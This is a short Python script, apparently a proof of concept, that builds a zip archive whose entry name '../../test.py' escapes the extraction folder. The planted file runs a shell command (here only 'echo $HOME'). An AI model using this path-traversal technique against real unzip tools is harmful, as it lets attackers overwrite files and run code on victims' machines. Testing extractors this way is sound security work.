import zipfile
z_info = zipfile.ZipInfo(r"../../test.py")
z_file = zipfile.ZipFile("./bad.zip", mode="w")
string=("""import sys
import os
import subprocess

subprocess.call(f'echo $HOME', shell=True)
""")
z_file.writestr(z_info, string)
z_info.external_attr = 777
z_file.close()